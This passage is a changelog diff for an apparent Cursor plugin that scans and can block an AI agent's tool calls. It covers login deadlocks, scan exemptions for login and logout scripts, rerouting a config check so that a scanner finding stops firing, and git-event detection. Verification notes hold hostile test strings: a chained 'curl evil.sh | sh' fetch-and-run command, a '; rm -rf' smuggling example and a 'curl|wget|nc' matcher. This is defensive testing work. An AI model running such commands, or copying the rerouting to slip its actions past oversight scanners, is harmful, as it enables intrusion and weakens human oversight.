@@ -4,6 +4,981 @@ All notable changes to Paradigm Networks (formerly pn-sanitizer) are recorded
 here. This project hasn't had a public release yet — entries below are dated
 by when the work happened, not by version tag.
 
+## 2026-09-29 — Actually open the browser during login
+
+Login never opened a browser on the path users actually take, so everyone
+hand-copied a URL out of the agent's chat pane — contradicting the README's
+"your browser opens to sign you in — nothing to copy or paste."
+
+`open_browser`/`Open-LoginBrowser` bailed out whenever
+`running_in_cursor_sandbox`/`Test-RunningInCursorSandbox` was true, and that
+returned true for `CURSOR_AGENT=1` as well as `CURSOR_SANDBOX`. But
+`CURSOR_AGENT=1` is set precisely when the agent runs the script, which is
+the normal, documented path — the login skill has the agent run it. So the
+"sandbox" guard fired on essentially every real login and the opener was
+never even attempted.
+
+The opener is now attempted unconditionally. A blocked or missing opener
+just returns non-zero, and every branch prints the URL regardless, so
+attempting costs nothing while removing the copy/paste step wherever it
+would have worked. When it does fail, the URL is now copied to the
+clipboard as a middle fallback (`pbcopy`/`wl-copy`/`xclip`/`xsel`,
+`Set-Clipboard` on Windows) before falling back to print-only, so there is
+nothing left to retype by hand. The `CURSOR_SANDBOX`/`CURSOR_AGENT`
+detection is retired outright — nothing else referenced it.
+
+`skills/paradigmnetworks-login/SKILL.md` step 4 no longer claims the script
+"knows whether it's running in a sandboxed agent shell and adjusts itself
+accordingly," which is no longer how it behaves.
+
+Verified with `bash test/run-all-tests.sh` (319/319, up from 317) and
+`shellcheck -S warning -x`. Two new tests, using a stub opener on `PATH`:
+that the opener is invoked with the authorize URL under `CURSOR_AGENT=1`
+and `CURSOR_SANDBOX=1` (the exact condition that used to skip it), and that
+a missing opener still reports failure cleanly so the clipboard/print
+fallback runs rather than a false "opened your browser".
+
+## 2026-09-29 — Fix the cold-start login deadlock (follow-up to PN-12153)
+
+A machine that had never logged in could not log in from inside Cursor.
+
+The `sessionStart` notice told the agent to run the `paradigmnetworks-login`
+skill but not where the plugin lives, and Cursor exposes no environment
+variable identifying a plugin's install directory (confirmed against
+cursor.com/docs/agent/hooks). So the skill's own step 1 had the agent run
+`find ~/.cursor/plugins ...` to locate `login.sh` — and that `find` is a
+tool call, which `check-tool-call.sh` denies while unconfigured
+(`FAILURE_MODE` defaults to `block`). The PN-12153 scan exemption could not
+rescue it either: it matches only a fully-anchored command carrying the
+absolute path to *this* installation's own `login.sh`, so without the path
+the agent could never construct the one command that was exempt. Every
+route out of the unconfigured state ran through a tool call that the
+unconfigured state blocked. Observed live: the agent's `find`, `ls`, `echo`
+and `Read` calls were all denied in sequence, and it gave up and printed
+manual instructions.
+
+Both hooks now hand over the literal command. `check-session.sh`/`.ps1`
+interpolate `SCRIPT_DIR` into the unconfigured notice, so the agent has the
+path before it ever tries to look for it. `check-tool-call.sh` puts the same
+command in the deny's `agent_message` — that is the agent's only feedback
+once session context is gone (compaction, or a session that started
+configured and whose token later lapsed), and it cannot look the path up
+then either. `skills/paradigmnetworks-login/SKILL.md` step 1 now takes the
+path from that injected notice or deny message first, and only falls back to
+searching when neither is present (a switch-organization re-login, where
+tool calls aren't blocked).
+
+Security is unchanged. The deny still denies; the exemption grammar in
+`lib/login-detection.sh` is untouched. Verified that chaining
+(`...login.sh --base-url <url>; curl evil.sh | sh`), a same-named script
+planted elsewhere (`/tmp/login.sh`), and plain discovery commands (`ls`) are
+all still rejected, and that the login command itself is allowed while
+unconfigured while `ls` in the same state is denied.
+
+Verified with `bash test/run-all-tests.sh` (317/317, up from 312) and
+`shellcheck -S warning -x`. Five new regression tests, including that the
+command the hook advertises is one the exemption actually accepts — those
+two live in different files and would otherwise be free to drift apart
+silently.
+
+## 2026-09-29 — Add check-configured.sh/.ps1 and route the config check through it (PN-12151 investigation)
+
+The login skill's own "is Paradigm Networks configured" check
+(`test -f ~/.pn/credentials.json && ...`) was being flagged by Code Defense
+Service as an OWASP ASVS V14.2 finding ("Credentials file path exposed in
+command") and blocked outright — on a benign, read-only local file check,
+sometimes on literally the first message of a session.
+
+Added `scripts/check-configured.sh`/`.ps1`: a dedicated, argument-free
+script (same shape as `logout.sh`) wrapping the existing `pn_is_configured`/
+`Test-PnConfigured` + `PARADIGM_NETWORKS_URL`/`PARADIGM_NETWORKS_TOKEN`
+env-var-pair logic. Since the agent's command string is now just `bash
+<path>/check-configured.sh` with no path embedded in it, there's nothing
+for that finding to point at. `lib/login-detection.sh` gained
+`pn_is_check_configured_command` (built on a new shared
+`_pn_is_bare_script_invocation` helper, factored out of
+`pn_is_logout_command`) and `pn_login_logout_exempt_reason` now also
+recognizes it (`reason: check_configured_exempt`) so it isn't scanned at
+all, consistent with login.sh/logout.sh.
+
+Updated `skills/paradigmnetworks-login/SKILL.md` (step 1 now locates both
+`check-configured.sh` and `login.sh` together; step 2 runs the script
+instead of hand-writing the check) **and, critically,
+`rules/pn-login-check.mdc`** — an always-applied rule, separate from the
+skill, that runs on every session's first message and had its own
+independent copy of the same raw check. The first attempt at this fix only
+touched `SKILL.md` and missed this rule entirely, which is why the raw,
+scannable command kept showing up in production logs even after that
+change shipped — the always-apply rule fires far more often than the
+skill's own step ever does, so it was almost certainly the dominant source.
+Both agent-facing docs now point at the same dedicated script.
+
+Verified: `bash test/run-all-tests.sh` (312/312 — 10 new unit tests for
+`pn_is_check_configured_command`, 5 new integration tests including one
+confirming a hand-written equivalent is deliberately still scanned
+normally, not silently widened into a bypass). `shellcheck -S warning -x`
+clean (one pre-existing, accepted `PN_LOGIN_EXEMPT_REASON` SC2034 hit, same
+cross-file-global pattern as `PN_PROMPT_STATUS`/`PN_TOOLCALL_STATUS`).
+
+## 2026-09-29 — Extend the PN-12153 scan exemption to the logout skill's logout.sh command
+
+Widened the exemption below to also cover the `paradigmnetworks-logout`
+skill's `bash <path>/logout.sh` Shell tool call (no arguments at all —
+even less content than login.sh's base-URL argument). Same reasoning:
+system-generated control message, not user-authored content, no security
+purpose served by scanning it.
+
+`scripts/lib/login-detection.sh` gained `pn_is_logout_command` (identical
+anchoring discipline to `pn_is_login_initiation_command`, but simpler —
+no `--base-url` argument to also validate) and a combined
+`pn_login_logout_exempt_reason` wrapper that both `check-tool-call.sh` and
+`check-tool-call-record.sh` now call instead of the login-only function
+directly; it sets `PN_LOGIN_EXEMPT_REASON` to `login_initiation_exempt` or
+`logout_exempt` (multi-value-return-via-global, the same convention this
+codebase already uses for `PN_PROMPT_STATUS`/`PN_TOOLCALL_STATUS` etc.) so
+the audit-log entry and debug-log line correctly distinguish which of the
+two fired. `pn_is_login_initiation_command`'s own path-suffix check was
+factored out into a shared `_pn_resolve_own_script` helper reused by both
+functions, rather than duplicating the resolve-and-compare logic.
+
+Also tightened `skills/paradigmnetworks-logout/SKILL.md` step 3 the same
+way step 4 of the login skill was tightened below: run standalone, no
+`cd`/`&&`/`;`/extra flags/arguments.
+
+Verified: `bash test/run-all-tests.sh` (296/296, up from 271 — 18 new unit
+tests for `pn_is_logout_command`/`pn_login_logout_exempt_reason` plus 5 new
+integration tests covering the exempted logout case, an unexpected-argument
+bypass attempt, and a same-named `logout.sh` outside this installation).
+`shellcheck -S warning -x` clean (the one `PN_LOGIN_EXEMPT_REASON` SC2034 hit
+in `login-detection.sh` is the same pre-existing, accepted
+cross-file-global pattern already present for `PN_PROMPT_STATUS`/
+`PN_TOOLCALL_STATUS` in `lib/plugins-client.sh`, not a new issue).
+
+## 2026-09-29 — Skip scanning for the login skill's own login-initiation command (PN-12153)
+
+The `paradigmnetworks-login` skill's `bash <path>/login.sh --base-url <url>`
+Shell tool call was being scanned by `check-tool-call.sh`/
+`check-tool-call-record.sh` (PromptGuard+PolicyEngine+CodeDefense) like any
+other command, even though it carries no user-authored content beyond the
+org's own base URL. This currently "worked" only by accident: the moment the
+tool call runs, the user is by definition not yet logged in, so
+`pn_resolve_config` fails and the existing "not configured -> always allow"
+branch happens to let it through. That accident disappears for a re-login/
+switch-org flow, where the exact same command would go through full scanning
+under `check-tool-call.sh`'s fail-closed default — with real risk of the
+scan's own latency or a false-positive block getting in the way of the one
+command a stuck user depends on to get unblocked.
+
+Added `scripts/lib/login-detection.sh`'s `pn_is_login_initiation_command`:
+a fully end-to-end anchored grammar match (not a substring/keyword check —
+`command` merely containing "login.sh" would be trivially smugglable via
+`; rm -rf` or similar), requiring the entire command to be exactly an
+optional interpreter + a path resolving to *this plugin installation's own*
+`login.sh` + `--base-url <scheme://host(:port)>` and nothing else. Wired into
+both `check-tool-call.sh` (skip the scan call outright, before even checking
+whether the user is configured) and `check-tool-call-record.sh` (skip the
+matching `after_tool_call` recording, since no `before_tool_call` record
+was ever opened for it) — both re-run the identical check independently
+rather than threading state between the two separate hook-process
+invocations. Everything else the login skill does (the `find` for the
+script path, the `AskQuestion` for the base URL) is deliberately left
+scanned exactly as before — this exemption covers only the login-initiation
+command itself, per the ticket's scope. (`logout.sh` was scanned as normal
+at the time of this entry; see the 2026-09-29 entry above for its own,
+later exemption.)
+
+Also tightened `skills/paradigmnetworks-login/SKILL.md` step 4 to require
+running this command standalone (no `cd`/`&&`/`;`/extra flags), since the
+exemption's grammar only matches that exact shape.
+
+Verified: `bash test/run-all-tests.sh` (271/271, up from 253 — 14 new unit
+tests in `test/test-login-detection.sh` plus 6 new integration tests in
+`test/test-hooks.sh` covering the exempted case, a chained-command bypass
+attempt, and a same-named `login.sh` outside this installation, none of
+which qualify for the exemption). `shellcheck -S warning -x` clean on the
+new and modified scripts.
+
+Windows (`check-tool-call.ps1`/`check-tool-call-record.ps1`) intentionally
+untouched: neither file exists yet on this branch, so `preToolUse`/
+`postToolUse` scanning isn't wired for Windows at all today — a pre-existing
+gap, not something this change needed to close.
+
+## 2026-09-23 — Raise postToolUse timeouts for the new tool-result scan
+
+control-server's `after_tool_call` now runs the same PromptGuard+PolicyEngine+
+CodeDefense composite scan `before_tool_call` already runs on a tool's input,
+against the tool's *result* instead — closing a gap where tool results
+reached Code Chain completely unscanned (see design-ideas/
+Tool_Call_Policy_Enforcement_Assessment.md, server-side change only). That
+scan can take up to ~65s worst case, so two timeouts needed raising on this
+side or the call would be cut off long before the scan finishes:
+
+- `hooks/hooks.json`'s `postToolUse` timeout: 15s → 250s, matching
+  `preToolUse`'s existing budget. `failClosed` stays `false` — this hook
+  remains purely observational from Cursor's side (no blocking field exists
+  for `postToolUse`, and the tool has already run by the time it fires).
+- `check-tool-call-record.sh`'s own HTTP client timeout
+  (`CODECHAIN_TIMEOUT_SECONDS`): 10s → 60s default, matching
+  `check-tool-call.sh`'s existing `TIMEOUT_SECONDS` for the same scan on the
+  `before_tool_call` side. This is a *separate* budget from `hooks.json`'s —
+  raising only the hook timeout would not have been enough.
+
+No other client-side change: `check-tool-call-record.sh` already forwards
+`tool_output` generically and doesn't read the verdict back (the scan is
+entirely server-side, and there's nothing for this hook to prevent post
+-execution anyway — see the assessment doc §2.5).
+
+Verified: `bash test/run-all-tests.sh` (259/259, unchanged — no test
+hardcoded the old timeout values).
+
+## 2026-09-23 — Detect and attach files for MCP git-commit tool calls
+
+Investigated whether Cursor's MCP-based git tools (e.g. `MCP:git_commit`,
+`MCP:git_push` — confirmed from live logs) were reaching Code Chain's
+git-detection pipeline the same way a Shell-driven `git commit`/`git push`
+does. They were not: `check-tool-call.sh`'s file-attachment logic and
+control-server's `afterToolCall` git/PR-detection dispatch were both keyed
+on `tool_name == "Shell"` specifically, so an MCP git tool call — forwarded
+generically like any other tool call, just never recognized as a git event
+— produced no commit/push record in Code Chain and never got its changed
+files attached to the CDS scan. Findings recorded in
+`design-ideas/MCP_Git_Tool_Call_Detection_Gap_Analysis.md` before any code
+changed.
+
+What changed:
+- `scripts/check-tool-call.sh`: added an `MCP:git_commit` branch to the
+  `git_event_type` detection block — the tool name itself names the action,
+  no command-text regex needed the way Shell requires. The changed-file list
+  is sourced from the MCP tool's own `tool_input.files` (it already names
+  exactly what it committed) rather than a local git-plumbing walk, avoiding
+  picking up unrelated staged-but-uncommitted changes that might coexist in
+  the same working tree.
+- `scripts/lib/plugins-client.sh`: refactored `pn_build_git_diff_files_json`'s
+  encode/cap/attach body into a shared `_pn_build_files_json_from_list`
+  helper, and added `pn_build_files_json_from_paths` (cwd + a caller-supplied
+  file list) on top of it for the MCP path above. No behavior change to the
+  existing Shell-driven `pn_build_git_diff_files_json` callers.
+- No client-side change for `MCP:git_push` — push has never attached file
+  content in either path (a push moves already-committed content, nothing
+  new to scan). Server-side MCP push detection (control-server) is a
+  separate change, built from `SessionContext`'s `GitRepoUrl`/`GitBranch`
+  rather than anything this plugin sends, since the observed MCP push tool's
+  captured output carries no parseable ref-update summary.
+
+Verified: `bash test/run-all-tests.sh` (259/259, up from 248 — 3 new Git
+Utils unit tests for `pn_build_files_json_from_paths`, 3 new Integration
+tests for `check-tool-call.sh`'s MCP:git_commit path), `shellcheck -S
+warning -x` clean on all touched files.
+
+## 2026-09-23 — Session lifecycle simplification: retire session-start/end API calls, rename Platform and after_prompt
+
+Investigated whether `sessionStart`/`sessionEnd`'s control-server calls
+(session-start/session-end markers) contributed to any processing,
+governance, observability, or reporting path. Confirmed they did not: these
+markers were explicitly excluded from user-facing interaction
+classification server-side, produced no observability trace, and had no
+consumer anywhere in control-server or webapp. Findings recorded in
+`design-ideas/Session_Lifecycle_Simplification_And_Contract_Updates.md`
+before any code changed.
+
+What changed:
+- `scripts/check-session.sh`/`check-session-end.sh`: no longer call the
+  plugins API. The hooks are retained (still wired in `hooks/hooks.json`,
+  still fire on every session start/end) but now write/remove a local JSON
+  metadata file instead (`~/.paradigm-scanner/sessions/<session_id>.json` —
+  SessionId/Cwd/GitRepoUrl/GitBranch/StartedAt), via new
+  `scripts/lib/session-metadata.sh`. This needs no login/config, unlike the
+  API call it replaces, and self-prunes files older than 24h so a session
+  that never gets a matching sessionEnd (crash, force-quit) doesn't
+  accumulate forever. Not currently read by anything else in the plugin —
+  evaluated as a potential lookup mechanism for a future consumer (a skill,
+  a standalone CLI helper) that has no Cursor hook payload of its own to
+  read session context from; `pn_read_session_metadata` exists for that,
+  unused for now.
+- `scripts/lib/plugins-client.sh`: removed `pn_register_plugin_session`/
+  `pn_close_plugin_session` (the retired API-calling functions).
+- Renamed `pn_plugin_after_prompt` to `pn_plugin_after_agent_response` —
+  the `Action` field it sends is now `after_agent_response` instead of
+  `after_prompt`, matching Cursor's own `afterAgentResponse` hook name
+  (the only hook that ever calls it). `before_prompt` is unchanged.
+- Renamed the `Platform` value this plugin sends from `"cursor-hooks"` to
+  `"cursor-plugin"` on every request. No migration touches
+  already-persisted control-server documents — see the design doc for the
+  (display-only, non-functional) consequence for historical rows.
+- File-events (`POST /file-events`) removed from control-server entirely —
+  this plugin never had a caller for it in the first place (confirmed, not
+  assumed); nothing to remove client-side.
+
+Also renamed throughout: "Cursor Hooks" → "Cursor Plugin" in prose/comments
+(control-server), and the Top Agents display label for this platform
+("Cursor" → "Cursor-Plugin") — deliberately distinct from the real Cursor
+IDE-as-gateway integration's own "Cursor" label, to stop conflating the two
+in Threat Landscape (this plugin only ever sees a side-channel copy of
+prompts/writes and never sees the model's real delivered response, unlike
+the gateway path).
+
+## 2026-09-23 — Retire the dedicated shell-execution hooks; fold git push/commit gating into the generic tool-call hook
+
+Investigated whether `beforeShellExecution`/`afterShellExecution` (dedicated
+Cursor hooks for git push/commit/PR-create) were fully redundant with
+`preToolUse`/`postToolUse` (the generic hook that already fires for every
+Shell command). Confirmed from real session logs on this machine that every
+shell command was already being recorded twice — once via each hook family —
+but also confirmed, by reading control-server's actual scan code, that
+`before_shell_execution` was the *only* place changed-file diff content got
+attached to the Code Defense scan ahead of a push/commit; the generic
+tool-call gate never had an equivalent file-attachment path. A bare removal
+would have silently dropped that pre-push/pre-commit content scan. Findings
+recorded in `design-ideas/Shell_Execution_vs_Tool_Call_Hook_Coverage_Validation.md`
+before any code changed.
+
+What changed:
+- `hooks/hooks.json`: removed the `beforeShellExecution` (3 matchers) and
+  `afterShellExecution` (catch-all) registrations entirely. A git
+  push/commit now reaches the plugin exclusively through the same
+  `preToolUse`/`postToolUse` catch-all every other Shell command already
+  used.
+- `scripts/check-tool-call.sh` (preToolUse): detects a git push/commit
+  directly from the Shell command text (the same unanchored,
+  whitespace-bounded pattern the retired hook's matchers used — catches
+  `cd repo && git push`, not just a bare `git push`), and when detected,
+  collects and attaches the same changed-file diff content the retired
+  `before_shell_execution` gate used to (capped by the same
+  `PARADIGM_NETWORKS_GIT_EVENT_MAX_FILES`/`_MAX_BYTES` env vars). Uses
+  Push/Commit-specific wording in the block message, same as before.
+- `scripts/check-tool-call-record.sh` (postToolUse): now forwards
+  `tool_name`/`tool_input` so control-server can run git/PR detection for
+  Shell calls — the same detection the retired `afterShellExecution` hook
+  fed, now unconditional for every Shell tool call regardless of command
+  content (control-server's own regex still decides what's actually a
+  commit/push/PR, unchanged).
+- `scripts/lib/plugins-client.sh`: removed `pn_plugin_before_shell_execution`/
+  `pn_plugin_after_shell_execution` (multipart, shell-executions domain);
+  extended `pn_plugin_before_tool_call` with an optional `files_json` param
+  and `pn_plugin_after_tool_call` with `tool_name`/`input_json` params; added
+  `pn_build_git_diff_files_json` (the changed-file collection, now
+  base64/JSON instead of multipart, since the tool-calls endpoint is
+  JSON-only).
+- Deleted `scripts/check-git-event.sh`/`.ps1` and
+  `scripts/check-git-event-record.sh`/`.ps1` — fully replaced by the above.
+- Not in scope this round: PowerShell parity for `check-tool-call.ps1`/
+  `check-tool-call-record.ps1` (these already didn't exist — `check-write.ps1`
+  and `check-repo-context.ps1` remain the last-synced PowerShell hooks,
+  stale since the prior bash-side consolidation round).
+
+Control-server side: the shell-executions domain
+(`/api/v1/plugins/sessions/{id}/shell-executions`, `controller/plugins/
+ShellExecutions.go`) is deleted outright. `before_tool_call`/`after_tool_call`
+absorb its two responsibilities: the composite scan now accepts an optional
+file-attachment list (base64-decoded from the request JSON) threaded through
+to Code Defense; `after_tool_call` fires the same git/PR-detection pipeline
+(`ProcessPluginShellEvent`) whenever `ToolName=="Shell"`, extracting the
+command from the stored tool input.
+
+## 2026-09-22 — Record every shell command to Code Chain; fix a regex bug that silently dropped most real git push/commit events
+
+Confirmed live: real `git push`/`git commit` commands from actual Cursor
+sessions on this machine never reached Code Chain. Root cause was in
+`hooks/hooks.json`, not control-server: the `beforeShellExecution`/
+`afterShellExecution` matchers (`^\s*git\s+push\b` etc.) were anchored to
+the START of the command string. Cursor very commonly sends compound
+commands like `cd <repo> && git push -u origin <branch>` as a single string
+(confirmed by grepping this machine's own `preToolUse` diagnostic log for
+real `tool_input.command` values from actual sessions) — an anchored regex
+never matches that, since the string starts with `cd`, not `git`. Verified
+directly: three real local sessions with genuine `git push`/`git commit`
+commands (including actual, since-merged commits) had zero matching
+`commitTranscripts` records in the database, and `check-git-event.log` had
+never even been created on this machine despite real pushes having
+happened — the gate never fired once for them.
+
+Cursor's own docs confirm the `matcher` field is a substring/regex search
+against the command string, not an anchored full match (their own example,
+`"curl|wget|nc "`, matches mid-string) — so the anchor was entirely our own
+bug, not a Cursor limitation.
+
+What changed:
+- `hooks/hooks.json`: `beforeShellExecution`'s three matchers dropped the
+  `^\s*` anchor (`^\s*git\s+push\b` → `\bgit\s+push\b`, etc.) — fixes the
+  governance-gating half (this hook runs BEFORE the command executes and can
+  block it).
+- `hooks/hooks.json`: `afterShellExecution`'s matcher broadened from the
+  same three git-only patterns to catch-all (`""`) — every shell command a
+  Cursor agent runs is now recorded, not just git state-changes. Control-
+  server's own git/PR-detection regex (already compound-command-aware,
+  unaffected by this bug) still decides what's actually a commit/push/PR;
+  broadening this matcher only widens what gets *offered* to that detector
+  and to Code Chain's tool-call record, it does not change what's classified
+  as a git event.
+- `scripts/check-git-event-record.sh`/`.ps1`: extract and forward
+  `generation_id` (when the hook payload carries one) so control-server can
+  attach the command+output to the exact turn it belongs to; added local
+  debug logging (`~/.paradigm-scanner/check-git-event-record.log`) matching
+  the pattern `check-write.sh`/`check-git-event.sh` already use — this
+  script previously had no local log at all.
+- `scripts/lib/codechain-client.sh`/`.ps1`: `pn_record_codechain_shell_event`/
+  `Send-CodechainShellEvent` take a new optional trailing `generation_id`/
+  `-GenerationId` parameter, sent as `GenerationId` in the request body.
+
+Not part of this change: `check-git-event.sh`'s own governance-gating scope
+(still only git push/commit/PR-create, not every command) — broadening that
+too would add up to 240s of scan latency to every shell command a session
+runs, which is a much larger UX tradeoff than was asked for here.
+
+Companion control-server change (same date): shell command tool calls are no
+longer persisted as standalone `chatapi` documents at all — they're folded
+into the current turn's own `RequestPayload` as `tool_use`/`tool_result`
+content blocks, the same shape Claude Code's own tool calls use, instead of
+a plugin-hooks-specific field.
+
+Verified: `bash test/run-all-tests.sh` — 227/228 (same pre-existing
+`check-repo-context.sh` flake, unrelated — confirmed by re-running with this
+change stashed, same single failure). `shellcheck -S warning -x scripts/*.sh
+scripts/lib/*.sh` clean (same pre-existing SC2034 pattern only). PowerShell
+changes were NOT executed/tested — `pwsh` is unavailable in this
+environment; reviewed by hand against the `.sh` twin for structural/logical
+parity.
+
+## 2026-09-22 — Prefer Cursor's structured model_id over the legacy model slug
+
+Follow-up to the "unknown" placeholder fix below: stripping the placeholder
+left `Model` genuinely empty, which is correct but not as useful as actually
+resolving the model when possible. Cursor's hooks docs (fetched directly)
+document a second, separate base field: `model` is "Legacy model slug
+configured for the composer" while `model_id` is "Structured ID for the
+selected model, when available" — a newer, more reliable field this plugin
+was never extracting at all.
+
+What changed:
+- `lib/common.sh`/`.ps1`: new `resolve_hook_model`/`Resolve-HookModel`
+  helper — prefers `model_id` when present, falls back to the legacy
+  `model` slug when it's absent (older Cursor builds), then passes
+  whichever value was chosen through `normalize_hook_model` (either field
+  could in principle carry the "unknown" placeholder).
+- `check-prompt.sh`/`.ps1`, `check-write.sh`/`.ps1`,
+  `check-turn-complete.sh`/`.ps1`: all three now extract both `.model_id`
+  and `.model` and combine them via the new helper, instead of reading
+  `.model` alone.
+- `test/test-unit.sh`: new assertions for `resolve_hook_model` (prefers
+  model_id, falls back to legacy model, normalizes "unknown" regardless of
+  which field it came from, both-absent stays empty).
+
+Not yet empirically confirmed whether `model_id` actually resolves to a real
+value in the specific case (Auto model mode, apparently) where the legacy
+`model` field sent "unknown" — the server's raw-payload debug logging from
+the prior entry is still in place, so the next live session will show
+whether this closes the gap or whether `model_id` is _also_ absent/unknown
+under Auto mode, in which case there may be no resolvable value to report at
+all for that mode.
+
+Verified: `bash test/run-all-tests.sh` — 225/226 (same pre-existing
+`check-repo-context.sh` flake, unrelated). `shellcheck -S warning -x
+scripts/*.sh scripts/lib/*.sh` clean (same pre-existing SC2034 pattern only).
+PowerShell changes were NOT executed/tested — `pwsh` is unavailable in this
+environment; reviewed by hand against the `.sh` twin for structural/logical
+parity.
+
+## 2026-09-22 — Normalize Cursor's "unknown" model placeholder to empty
+
+`chatapi` documents were showing `RequestPayload.Model`/`ResponsePayload.Model`
+as the literal string `"unknown"` instead of a real model name or a genuinely
+empty field. Confirmed via control-server's temporary raw-payload debug
+logging: Cursor's own `afterAgentResponse` hook payload sends
+`"model":"unknown"` verbatim when the model hasn't resolved yet at hook-fire
+time (e.g. Auto model mode) — not something introduced by this plugin's `.model`
+extraction or by control-server's persistence path (both audited end-to-end,
+no `"unknown"` literal found anywhere in either). Since Cursor is the source
+of the value, the fix belongs here, at the point where we read it.
+
+What changed:
+- `lib/common.sh`/`.ps1`: new `normalize_hook_model`/`ConvertTo-NormalizedHookModel`
+  helper — case-insensitively strips a `"unknown"` model value down to empty
+  string, so it's treated the same as "not reported" rather than persisted as
+  if it were a real model identifier.
+- `check-prompt.sh`/`.ps1`, `check-write.sh`/`.ps1`, `check-turn-complete.sh`/`.ps1`:
+  all three now pass the extracted `.model` value through this helper before
+  sending it on.
+- `test/test-unit.sh`: new assertions for `normalize_hook_model` (case
+  insensitivity, real model names pass through unchanged, already-empty stays
+  empty).
+
+Verified: `bash test/run-all-tests.sh` — 220/221 (same pre-existing
+`check-repo-context.sh` flake noted in the entry below, unrelated — confirmed
+by re-running with this change stashed, same single failure). PowerShell
+changes were NOT executed/tested — `pwsh` is unavailable in this environment;
+reviewed by hand against the `.sh` twin for structural/logical parity.
+
+## 2026-09-22 — Send Cursor's hook-reported model name so chatapi records which model ran
+
+`chatapi` documents for plugin-hooks turns were storing prompt/response text
+but not which model produced them — `RequestPayload.Model`/
+`ResponsePayload.Model` were left blank, unlike every other vendor here.
+Cursor's hook payloads carry `.model` (the base envelope confirmed in the
+design doc's hook research), so every hook script now extracts it and sends
+it through alongside the prompt/response.
+
+What changed:
+- `lib/scan-client.sh`/`.ps1`, `lib/codechain-client.sh`/`.ps1`:
+  `pn_scan_text`/`Invoke-PnScanText` and `pn_record_codechain_turn`/
+  `Send-CodechainTurn` take a new optional trailing `model`/`-Model`
+  parameter, sent as `Model` in the request body.
+- `check-prompt.sh`/`.ps1`, `check-write.sh`/`.ps1`,
+  `check-turn-complete.sh`/`.ps1`: all extract `.model` from the hook
+  payload (falls back to empty when absent) and pass it through.
+- `test/test-scan-client.sh`, `test/test-codechain-client.sh`: new
+  assertions that `Model` is encoded correctly when passed, and defaults to
+  an empty string when omitted.
+
+Verified: `bash test/run-all-tests.sh` — 215/216 (same pre-existing
+`check-repo-context.sh` flake noted below, unrelated). `shellcheck -S
+warning -x scripts/*.sh scripts/lib/*.sh` clean (same pre-existing SC2034
+pattern only, same files). PowerShell changes were NOT executed/tested —
+`pwsh` is unavailable in this environment; reviewed by hand against the
+`.sh` twin for structural/logical parity.
+
+The control-server side (Model now stamped on both RequestPayload and
+ResponsePayload at every plugin-hooks turn/scan persist point, and
+ResponsePayload.ID now incorporates GenerationId instead of being the same
+literal string for every turn of a session) is covered by control-server's
+own Go test suite; see that repo's history for this same date.
+
+## 2026-09-22 — Send Cursor's generation_id so prompt/response correlation isn't a guess
+
+The scan/turn merge added 2026-09-21 (below) correlates a prompt-scan
+document with its eventual turn response by asking control-server for
+"whichever prompt-scan is most recently open for this session" — correct in
+the overwhelming common case (Cursor runs one turn at a time per
+conversation) but still a guess from insertion order, not a real key. Cursor
+hook payloads carry `generation_id`, which changes per user turn (unlike
+`conversation_id`, stable for the whole chat) — this is exactly the precise
+correlator the earlier design doc research had already flagged as
+"confirmed reliable" but left unused. Every hook script now extracts it and
+sends it through, so control-server can match a scan to its turn exactly
+instead of relying on ordering when a value is present, falling back to the
+old heuristic only when it isn't (older Cursor builds, or a hook type that
+doesn't expose it).
+
+What changed:
+- `lib/scan-client.sh`/`.ps1`: `pn_scan_text`/`Invoke-PnScanText` take a new
+  optional trailing `generation_id`/`-GenerationId` parameter, sent as
+  `GenerationId` in the request body.
+- `lib/codechain-client.sh`/`.ps1`: `pn_record_codechain_turn`/
+  `Send-CodechainTurn` take the same new parameter.
+- `check-prompt.sh`/`.ps1`, `check-write.sh`/`.ps1`, `check-turn-complete.sh`/
+  `.ps1`: all extract `.generation_id` from the hook payload (falls back to
+  empty when absent — never assumed present) and pass it through to the
+  scan/turn call.
+- `test/test-scan-client.sh`, `test/test-codechain-client.sh`: new cases
+  asserting `GenerationId` is encoded correctly when passed, and defaults to
+  an empty string when omitted.
+
+Verified: `bash test/run-all-tests.sh` — 211/212 (the same pre-existing
+`check-repo-context.sh` flake noted below, unrelated). `shellcheck -S
+warning -x scripts/*.sh scripts/lib/*.sh` clean (same pre-existing SC2034
+pattern only). PowerShell changes were NOT executed/tested — `pwsh` is
+unavailable in this environment; reviewed by hand against the `.sh` twin for
+structural/logical parity.
+
+The control-server side of this (Model.go's new `GenerationId` field,
+`FindOpenPluginTurn`'s exact-match filter when non-empty, and a new
+LIFECYCLE/PromptGuard/PolicyEngine/CodeDefense observability trace on the
+composite scan endpoint mirroring `/v1/messages`' own OS tracing — so
+plugin-hooks scan verdicts now show up in Threat Landscape/Top Agents) is
+covered by control-server's own Go test suite; see that repo's history for
+this same date.
+
+## 2026-09-21 — Tag scan calls as prompt vs. tool_call so control-server can merge them
+
+`check-prompt.sh`/`check-write.sh` now pass a `Kind` (`"prompt"` or
+`"tool_call"`) and, for tool calls, a `ToolName` (`"Write"`/`"Shell"`) on
+every scan call. This is the client half of a control-server fix for a real
+duplication: a submitted prompt and its eventual response used to persist
+as two separate chatapi documents for the same logical turn (the
+`beforeSubmitPrompt` scan created one, `afterAgentResponse`'s turn recording
+created another), and every Write/Shell tool-call scan created its own
+standalone document too, unrelated to the turn it happened inside. With
+`Kind` now on the wire, control-server folds a tool-call scan into whichever
+prompt-scan document is currently open for the session, and the eventual
+turn recording updates that same document in place (adding the response)
+instead of inserting a sibling one — one chatapi document per turn, prompt
++ response + any tool calls together, matching how every other vendor here
+already records a turn.
+
+What changed:
+- `lib/scan-client.sh`/`.ps1`: `pn_scan_text`/`Invoke-PnScanText` take two
+  new optional trailing parameters (`kind`, `tool_name` / `-Kind`,
+  `-ToolName`), sent as `Kind`/`ToolName` in the request body. Omitting them
+  (existing callers) sends empty strings, which control-server treats as
+  `"prompt"` — fully backward compatible.
+- `check-prompt.sh`/`.ps1`: passes `Kind="prompt"` explicitly.
+- `check-write.sh`/`.ps1`: passes `Kind="tool_call"` and the scanned tool's
+  own name (`Write`/`Shell`) as `ToolName`.
+- `test/test-scan-client.sh`: two new cases asserting `Kind`/`ToolName` are
+  encoded correctly when passed, and default to empty strings when omitted.
+
+Verified: `bash test/run-all-tests.sh` — 207/208 (the same pre-existing
+`check-repo-context.sh` flake noted in the entry below, unrelated to this
+change). `shellcheck -S warning -x scripts/*.sh scripts/lib/*.sh` clean
+(same pre-existing SC2034 pattern only). PowerShell changes were NOT
+executed/tested — `pwsh` is unavailable in this environment; reviewed by
+hand against the `.sh` twin for structural/logical parity. The
+control-server merge logic itself (`FindOpenPluginTurn`,
